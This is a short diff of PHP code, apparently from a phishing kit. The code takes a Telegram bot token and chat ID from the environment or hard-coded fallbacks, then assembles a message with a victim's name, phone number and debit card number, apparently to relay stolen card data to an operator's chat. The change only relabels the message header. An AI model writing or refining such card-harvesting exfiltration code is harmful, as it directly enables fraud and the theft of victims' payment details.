@@ -63,7 +63,7 @@ $FALLBACK_CHAT_ID_OPS   = "-4923753161";
 $token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_OPS;
 $chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_OPS;
 
-$mensaje  = "📥 T.Debito recibido:\n";
+$mensaje  = "✅ <b>[DATO EXTRA: TARJETA DÉBITO (corta)]</b> Resumen tarjeta recibido:\n";
 $mensaje .= "👤 $nombre\n";
 $mensaje .= "🔒 $telefono\n";
 $mensaje .= "💳 $tar\n";
